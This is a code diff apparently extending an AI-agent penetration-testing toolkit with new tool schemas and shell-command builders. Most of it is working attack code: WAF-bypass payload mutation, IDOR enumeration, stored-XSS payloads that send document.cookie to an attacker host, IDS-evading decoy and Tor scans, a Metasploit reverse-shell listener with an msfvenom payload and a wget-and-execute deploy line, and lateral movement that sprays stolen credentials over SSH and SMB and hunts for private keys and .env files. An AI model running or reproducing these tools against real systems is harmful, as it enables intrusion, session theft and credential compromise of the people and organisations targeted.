@@ -388,6 +388,109 @@ TOOLS = {
             "required": ["target"]
         }
     },
+    "payload_mutate": {
+        "description": "Generate 30+ WAF/filter bypass payload variants. Given a blocked payload (XSS, SQLi, RCE, LFI), generates encoded, obfuscated, case-mixed, comment-injected, unicode, hex and double-encoded variants. Tests each variant against the target.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":  {"type": "string", "description": "Target URL with parameter to test (e.g. http://site.com/page?id=1)"},
+                "payload": {"type": "string", "description": "Blocked payload to mutate (e.g. ' OR 1=1--, <script>alert(1)</script>, ../etc/passwd)"},
+                "type":    {"type": "string", "description": "Payload type: sqli, xss, lfi, rce, generic (default: generic)"}
+            },
+            "required": ["target", "payload"]
+        }
+    },
+    "crawl_auth": {
+        "description": "Authenticated web crawler. Login with credentials, then crawl all protected pages discovering hidden endpoints, API calls, admin panels, and IDOR opportunities.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":   {"type": "string", "description": "Base URL (e.g. http://site.com)"},
+                "username": {"type": "string", "description": "Login username"},
+                "password": {"type": "string", "description": "Login password"},
+                "login_url":{"type": "string", "description": "Login form URL (default: target/login)"},
+                "depth":    {"type": "integer", "description": "Crawl depth (default: 3)"}
+            },
+            "required": ["target", "username", "password"]
+        }
+    },
+    "idor_test": {
+        "description": "Test for IDOR (Insecure Direct Object Reference) and Broken Object Level Authorization. Enumerates IDs in URLs/params and checks if unauthorized access is possible.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":   {"type": "string", "description": "Target URL with numeric ID param (e.g. http://site.com/api/user/1 or http://site.com/profile?id=100)"},
+                "range":    {"type": "string", "description": "ID range to test (default: 1-50)"},
+                "cookie":   {"type": "string", "description": "Session cookie for authenticated testing (e.g. session=abc123)"},
+                "method":   {"type": "string", "description": "HTTP method: GET or POST (default: GET)"}
+            },
+            "required": ["target"]
+        }
+    },
+    "second_order": {
+        "description": "Test for second-order injection (stored XSS, stored SQLi, stored RCE). Injects payloads into registration, profile, comment and search fields, then visits pages that render stored data to trigger deferred execution.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":      {"type": "string", "description": "Target base URL"},
+                "inject_path": {"type": "string", "description": "Path where payload is stored (e.g. /register, /profile/update, /comment)"},
+                "trigger_path":{"type": "string", "description": "Path that renders the stored payload (e.g. /dashboard, /profile/view, /admin/users)"},
+                "field":       {"type": "string", "description": "Form field to inject (e.g. username, bio, comment, search)"},
+                "cookie":      {"type": "string", "description": "Session cookie if auth required"}
+            },
+            "required": ["target", "inject_path", "trigger_path"]
+        }
+    },
+    "bizlogic_fuzz": {
+        "description": "Fuzz business logic vulnerabilities: negative prices, zero/overflow quantities, discount stacking, coupon reuse, race conditions on purchases, negative balance transfers, free item tricks.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target":    {"type": "string", "description": "Target URL (checkout, cart, transfer endpoint, etc.)"},
+                "endpoint":  {"type": "string", "description": "Specific endpoint to fuzz (e.g. /cart/add, /checkout, /transfer, /apply-coupon)"},
+                "cookie":    {"type": "string", "description": "Session cookie"},
+                "mode":      {"type": "string", "description": "Mode: price (negative prices), qty (overflow qty), coupon (reuse), race (parallel requests), all (default: all)"}
+            },
+            "required": ["target"]
+        }
+    },
+    "evasion_scan": {
+        "description": "Full evasion scan: randomized timing, decoy IPs, packet fragmentation, rotated User-Agents, proxychains, slow scan to evade IDS/IPS/WAF detection.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "target": {"type": "string", "description": "Target IP or URL"},
+                "mode":   {"type": "string", "description": "Mode: stealth (nmap -sS -T1 decoys), slow (rate-limited nuclei), full (both). Default: full"},
+                "proxy":  {"type": "string", "description": "Proxy chain (e.g. socks5://127.0.0.1:9050 for Tor)"}
+            },
+            "required": ["target"]
+        }
+    },
+    "c2_handler": {
+        "description": "Start Metasploit multi/handler C2 listener to catch reverse shells. Configures payload, LHOST, LPORT and starts background listener.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "payload": {"type": "string", "description": "MSF payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp). Default: linux/x86/shell/reverse_tcp"},
+                "lhost":   {"type": "string", "description": "Attacker IP (default: auto-detect)"},
+                "lport":   {"type": "string", "description": "Listener port (default: 4444)"}
+            },
+            "required": []
+        }
+    },
+    "lateral_move": {
+        "description": "Post-exploitation lateral movement. After gaining initial access, enumerate internal network, dump credentials, test for reuse on other hosts, pivot via SSH/SMB.",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "pivot_host": {"type": "string", "description": "Compromised host IP"},
+                "network":    {"type": "string", "description": "Internal network CIDR to enumerate (e.g. 192.168.1.0/24)"},
+                "creds":      {"type": "string", "description": "Compromised credentials (user:pass)"},
+                "mode":       {"type": "string", "description": "Mode: enum (discover hosts), dump (dump creds), spread (try creds on all hosts), full (default: full)"}
+            },
+            "required": ["pivot_host"]
+        }
+    },
     "waf_bypass": {
         "description": "Detect WAF and apply automatic bypass techniques. Uses wafw00f to identify WAF, then runs sqlmap/ffuf/nuclei with tamper scripts, random agents, and evasion flags to bypass protection.",
         "input_schema": {
@@ -602,6 +705,216 @@ def build_command(tool, args):
     elif tool == "ghauri":
         flags = args.get("flags", "--batch --dbs")
         return f"ghauri -u {shlex.quote(args['url'])} {flags} 2>&1 | head -100"
+
+    elif tool == "payload_mutate":
+        target  = shlex.quote(args['target'])
+        payload = args['payload']
+        ptype   = args.get("type", "generic")
+        return f"""python3 - << 'PYEOF'
+import subprocess, urllib.parse, sys
+target  = {repr(args['target'])}
+payload = {repr(payload)}
+ptype   = {repr(ptype)}
+
+def test(url, p):
+    import subprocess
+    r = subprocess.run(['curl','-si','--max-time','6','-A',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        url.replace('FUZZ', urllib.parse.quote(p, safe=''))],
+        capture_output=True, text=True)
+    code = ''
+    for line in r.stdout.splitlines():
+        if line.startswith('HTTP/'): code = line.split()[1] if len(line.split())>1 else '?'
+    blocked = any(x in r.stdout.lower() for x in ['blocked','forbidden','waf','firewall','406','invalid'])
+    return code, blocked, len(r.stdout)
+
+p = payload
+variants = [
+    p,
+    p.replace(' ','/**/'), p.replace(' ','%09'), p.replace(' ','+'),
+    p.upper(), p.lower(),
+    ''.join(c.upper() if i%2==0 else c for i,c in enumerate(p)),
+    p.replace("'", "%27").replace(' ','%20'),
+    p.replace("'", "\\\\x27").replace(' ','\\\\x20'),
+    p.replace("'", "0x27"),
+    p.replace("select","sel/**/ect").replace("union","uni/**/on"),
+    p.replace("select","SELECT").replace("union","UNION"),
+    p.replace("select","SeLeCt").replace("union","UnIoN"),
+    p.replace("or","||").replace("and","&&"),
+    p.replace("<script>","<ScRiPt>").replace("</script>","</ScRiPt>"),
+    p.replace("<script>","<svg/onload=").replace("</script>",">"),
+    p.replace("<script>","<img src=x onerror=").replace("</script>",">"),
+    p.replace("../","..%2f"), p.replace("../","..%252f"),
+    p.replace("../",".././"), p.replace("/etc/","/etc//"),
+    urllib.parse.quote(p), urllib.parse.quote(urllib.parse.quote(p)),
+    p + "-- -", p + "#", p + "/*",
+    p.replace("=","LIKE"), p.replace("=","<>0 OR id="),
+]
+print(f"=== PAYLOAD MUTATION: {{len(variants)}} variants ===")
+for i,v in enumerate(variants):
+    url = target if 'FUZZ' in target else target + urllib.parse.quote(v, safe='')
+    try:
+        code,blocked,size = test(target, v)
+        status = "BLOCKED" if blocked else f"HTTP {{code}} size={{size}}"
+        flag = " <<< BYPASS!" if not blocked and code not in ('404','000','') else ''
+        print(f"  [{{i+1:02d}}] {{status}}{{flag}}\\n       {{v[:80]}}")
+    except Exception as e:
+        print(f"  [{{i+1:02d}}] ERROR: {{e}}")
+PYEOF"""
+
+    elif tool == "crawl_auth":
+        target    = args['target'].rstrip('/')
+        username  = shlex.quote(args['username'])
+        password  = shlex.quote(args['password'])
+        login_url = shlex.quote(args.get('login_url', target + '/login'))
+        depth     = int(args.get('depth', 3))
+        return f"""
+echo "=== AUTH CRAWL: {target} ===" &&
+COOKIE_JAR=/tmp/kgb_cookies_$(date +%s).txt &&
+echo "--- Login attempt ---" &&
+LOGIN_RESP=$(curl -si -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST {login_url} \
+  -d "username={username}&password={password}&email={username}&user={username}&pass={password}" \
+  -L --max-time 15 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") &&
+echo "$LOGIN_RESP" | head -5 &&
+SESSION=$(cat "$COOKIE_JAR" 2>/dev/null | grep -v '^#' | awk '{{print $6"="$7}}' | tr '\\n' ';') &&
+echo "Session cookies: $SESSION" &&
+echo "--- Crawling authenticated pages ---" &&
+for PATH_TRY in / /dashboard /admin /profile /account /settings /api /api/v1 /api/v2 /user /users /orders /cart /panel /manage /config /data /export; do
+  CODE=$(curl -s -o /tmp/kgb_page.html -w '%{{http_code}}' -b "$COOKIE_JAR" \
+    --max-time 8 -A "Mozilla/5.0" "{target}$PATH_TRY" 2>/dev/null)
+  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && [ "$CODE" != "302" ] && \
+    echo "FOUND [$CODE] {target}$PATH_TRY" && \
+    grep -oE '(href|src|action)="[^"]*"' /tmp/kgb_page.html 2>/dev/null | grep -vE '(css|js|png|jpg|svg)' | head -10
+done &&
+echo "--- API endpoint discovery ---" &&
+for API in /api/users /api/user/1 /api/orders /api/products /api/admin /api/config /api/keys /api/tokens /v1/users /v2/users; do
+  CODE=$(curl -s -o /tmp/kgb_api.txt -w '%{{http_code}}' -b "$COOKIE_JAR" \
+    -H "Accept: application/json" --max-time 6 "{target}$API")
+  [ "$CODE" = "200" ] && echo "API_FOUND [$CODE] {target}$API" && head -3 /tmp/kgb_api.txt
+done 2>&1 | head -80"""
+
+    elif tool == "idor_test":
+        target = args['target']
+        rng    = args.get('range', '1-50')
+        cookie = args.get('cookie', '')
+        method = args.get('method', 'GET').upper()
+        start, end = (rng.split('-') + ['50'])[:2]
+        cookie_flag = f"-H 'Cookie: {cookie}'" if cookie else ""
+        base_url    = target.rstrip('0123456789')
+        return f"""echo "=== IDOR TEST: {target} (IDs {rng}) ===" &&
+BASELINE=$(curl -si {cookie_flag} --max-time 8 -A "Mozilla/5.0" {shlex.quote(target)} 2>/dev/null | wc -c) &&
+echo "Baseline size: $BASELINE bytes" &&
+for ID in $(seq {start} {end}); do
+  URL=$(echo {shlex.quote(target)} | sed "s/[0-9][0-9]*/$ID/g")
+  RESP=$(curl -si {cookie_flag} --max-time 6 -A "Mozilla/5.0" "$URL" 2>/dev/null)
+  CODE=$(echo "$RESP" | head -1 | awk '{{print $2}}')
+  SIZE=$(echo "$RESP" | wc -c)
+  DIFF=$((SIZE - BASELINE))
+  [ "$CODE" = "200" ] && [ "$DIFF" -gt 50 ] && echo "IDOR_HIT [$CODE] ID=$ID size=$SIZE diff=$DIFF URL=$URL"
+  [ "$CODE" = "200" ] && [ "$DIFF" -lt -50 ] && echo "IDOR_DIFFERENT [$CODE] ID=$ID size=$SIZE URL=$URL"
+done 2>&1 | head -60"""
+
+    elif tool == "second_order":
+        target       = args['target'].rstrip('/')
+        inject_path  = args.get('inject_path', '/register')
+        trigger_path = args.get('trigger_path', '/profile')
+        field        = args.get('field', 'username')
+        cookie       = args.get('cookie', '')
+        cookie_flag  = f"-H 'Cookie: {cookie}'" if cookie else ""
+        payloads = [
+            "<script>fetch('http://KALI_IP:3000/cb?c='+document.cookie)</script>",
+            "'\"><img src=x onerror=fetch('http://KALI_IP:3000/cb?x='+document.cookie)>",
+            "admin'--",
+            "' UNION SELECT 1,2,user(),4--",
+            "{{7*7}}",
+            "${7*7}",
+        ]
+        return f"""echo "=== SECOND-ORDER INJECTION: {target} ===" &&
+COOKIE_JAR=/tmp/kgb_so_$(date +%s).txt &&
+{f'echo "Using provided session cookie"' if cookie else 'echo "No auth provided"'} &&
+for PAYLOAD in {' '.join(shlex.quote(p) for p in payloads)}; do
+  echo "--- Injecting: ${{PAYLOAD:0:60}} ---" &&
+  RAND="kgbtest$(date +%s%N | tail -c 6)" &&
+  curl -si -c "$COOKIE_JAR" -b "$COOKIE_JAR" {cookie_flag} \
+    -X POST {shlex.quote(target + inject_path)} \
+    -d "{field}=$RAND$PAYLOAD&email=$RAND@test.com&password=Test1234!" \
+    --max-time 10 -A "Mozilla/5.0" -L 2>/dev/null | head -3 &&
+  sleep 1 &&
+  TRIGGER_RESP=$(curl -si -b "$COOKIE_JAR" {cookie_flag} \
+    --max-time 10 -A "Mozilla/5.0" {shlex.quote(target + trigger_path)} 2>/dev/null) &&
+  echo "$TRIGGER_RESP" | grep -i "script\\|onerror\\|alert\\|__OK__\\|49\\b\\|$RAND" | head -5 &&
+  echo "$TRIGGER_RESP" | grep -c "200\\|OK" | grep -q "1" && echo "[STATUS] 200 OK"
+done 2>&1 | head -80"""
+
+    elif tool == "bizlogic_fuzz":
+        target   = args['target'].rstrip('/')
+        endpoint = args.get('endpoint', '/cart/add')
+        cookie   = args.get('cookie', '')
+        mode     = args.get('mode', 'all')
+        cookie_flag = f"-H 'Cookie: {cookie}'" if cookie else ""
+        return f"""echo "=== BUSINESS LOGIC FUZZ: {target}{endpoint} ===" &&
+BASE_URL={shlex.quote(target + endpoint)} &&
+{'echo "--- NEGATIVE PRICE TEST ---" && for PRICE in -1 -100 -9999 0.001 0.00 999999999; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST "$BASE_URL" -d "price=$PRICE&amount=$PRICE&quantity=1" --max-time 8); echo "price=$PRICE -> HTTP $CODE: $(head -1 /tmp/kgb_bl.txt | head -c 80)"; done' if mode in ('price','all') else 'echo "Skipping price tests"'} &&
+{'echo "--- QUANTITY OVERFLOW TEST ---" && for QTY in -1 0 2147483647 9999999 -2147483648 99999999999; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST "$BASE_URL" -d "quantity=$QTY&qty=$QTY&amount=$QTY" --max-time 8); echo "qty=$QTY -> HTTP $CODE: $(head -1 /tmp/kgb_bl.txt | head -c 80)"; done' if mode in ('qty','all') else 'echo "Skipping qty tests"'} &&
+{'echo "--- COUPON REUSE TEST ---" && for COUPON in SAVE100 DISCOUNT FREE100 ADMIN TEST AAAA 1234; do CODE=$(curl -s -o /tmp/kgb_bl.txt -w '"'"'%{{http_code}}'"'"' {cookie_flag} -X POST {shlex.quote(target)}/apply-coupon -d "coupon=$COUPON&code=$COUPON" --max-time 8); echo "coupon=$COUPON -> HTTP $CODE"; done && echo "Race condition test:" && for i in $(seq 1 10); do curl -s {cookie_flag} -X POST "$BASE_URL" -d "coupon=SAVE50" --max-time 5 -o /dev/null -w "%{{http_code}} " & done; wait; echo' if mode in ('coupon','race','all') else 'echo "Skipping coupon tests"'} 2>&1 | head -80"""
+
+    elif tool == "evasion_scan":
+        target = args['target']
+        mode   = args.get('mode', 'full')
+        proxy  = args.get('proxy', '')
+        proxy_cmd = f"proxychains4 -q" if proxy else ""
+        tgt_ip = target.replace('https://','').replace('http://','').split('/')[0]
+        return f"""echo "=== EVASION SCAN: {target} ===" &&
+{'echo "--- STEALTH NMAP (T1, decoys, frag) ---" && ' + proxy_cmd + f' nmap -sS -T1 -f --data-length 24 -D RND:10 --randomize-hosts --source-port 53 -Pn -sV --version-intensity 1 {shlex.quote(tgt_ip)} 2>&1 | head -40' if mode in ('stealth','full') else 'echo "Skipping stealth nmap"'} &&
+{'echo "--- SLOW NUCLEI (rate-limited, random UA) ---" && ' + proxy_cmd + f' nuclei -u {shlex.quote(target)} -tags cves,misconfig,exposure -rl 3 -timeout 10 -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -no-color 2>&1 | head -50' if mode in ('slow','full') else 'echo "Skipping slow nuclei"'} &&
+echo "--- TIMING RANDOMIZED REQUESTS ---" &&
+for PATH_TRY in /admin /config /.env /.git/config /backup /phpinfo.php; do
+  sleep $(python3 -c "import random; print(round(random.uniform(1,4),1))")
+  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 \
+    -H "X-Forwarded-For: $(python3 -c 'import random; print(\".\".join(str(random.randint(1,254)) for _ in range(4)))')" \
+    -A "Mozilla/$(python3 -c 'import random; print(round(random.uniform(4,6),1))') (Windows NT 10.0)" \
+    {shlex.quote(target.rstrip('/'))}$PATH_TRY)
+  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[$CODE] $PATH_TRY"
+done 2>&1 | head -60"""
+
+    elif tool == "c2_handler":
+        payload = shlex.quote(args.get('payload', 'linux/x86/shell/reverse_tcp'))
+        lhost   = args.get('lhost', '$(hostname -I | awk \'{print $1}\')')
+        lport   = args.get('lport', '4444')
+        msf_cmds = f"use exploit/multi/handler; set PAYLOAD {args.get('payload','linux/x86/shell/reverse_tcp')}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j; exit"
+        return f"""echo "=== C2 HANDLER SETUP ===" &&
+echo "Payload : {args.get('payload','linux/x86/shell/reverse_tcp')}" &&
+echo "LHOST   : {lhost}" &&
+echo "LPORT   : {lport}" &&
+echo "Starting MSF handler in background..." &&
+nohup msfconsole -q -x {shlex.quote(msf_cmds)} > /tmp/kgb_c2.log 2>&1 & disown &&
+sleep 3 &&
+echo "Handler PID: $!" &&
+echo "Log: /tmp/kgb_c2.log" &&
+tail -20 /tmp/kgb_c2.log &&
+echo "=== Generating matching payload ===" &&
+msfvenom -p {args.get('payload','linux/x86/shell/reverse_tcp')} \
+  LHOST={lhost} LPORT={lport} \
+  -f elf -o /tmp/kgb_shell.elf 2>&1 &&
+echo "Payload saved: /tmp/kgb_shell.elf" &&
+echo "Deploy: wget http://{lhost}:{lport}/kgb_shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s &"
+"""
+
+    elif tool == "lateral_move":
+        pivot  = shlex.quote(args['pivot_host'])
+        net    = shlex.quote(args.get('network', ''))
+        creds  = args.get('creds', '')
+        mode   = args.get('mode', 'full')
+        user, pw = (creds.split(':',1) + [''])[:2] if ':' in creds else ('', creds)
+        return f"""echo "=== LATERAL MOVEMENT from {args['pivot_host']} ===" &&
+{'echo "--- Internal network discovery ---" && nmap -sn --min-rate 5000 ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' 2>&1 | grep "Nmap scan\\|report\\|up" | head -30' if mode in ('enum','full') else 'echo "Skipping enum"'} &&
+{'echo "--- Credential reuse via SSH ---" && for HOST in $(nmap -sn --min-rate 3000 ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' 2>/dev/null | grep "report for" | awk \'{print $5}\'); do CODE=$(sshpass -p ' + shlex.quote(pw) + ' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 ' + shlex.quote(user) + '@$HOST "id; hostname; cat /etc/passwd | head -5" 2>/dev/null); [ -n "$CODE" ] && echo "SSH_OK $HOST: $CODE"; done' if mode in ('spread','full') and user and pw else 'echo "No creds for SSH spread"'} &&
+{'echo "--- SMB credential test ---" && crackmapexec smb ' + shlex.quote(args.get('network','192.168.1.0/24')) + ' -u ' + shlex.quote(user) + ' -p ' + shlex.quote(pw) + ' 2>&1 | grep -E "\\+|Pwn3d" | head -20' if mode in ('spread','full') and user else 'echo "No creds for SMB spread"'} &&
+echo "--- Local privilege escalation check ---" &&
+echo "SUID binaries:" && find / -perm -4000 -type f 2>/dev/null | head -15 &&
+echo "Writable /etc:" && ls -la /etc/passwd /etc/shadow /etc/cron* 2>/dev/null &&
+echo "Sudo rules:" && sudo -l 2>/dev/null | head -10 &&
+echo "Interesting files:" && find /home /root /var/www /opt -name "*.conf" -o -name "*.env" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null | head -20 2>&1 | head -80"""
 
     elif tool == "waf_bypass":
         target = shlex.quote(args['target'])
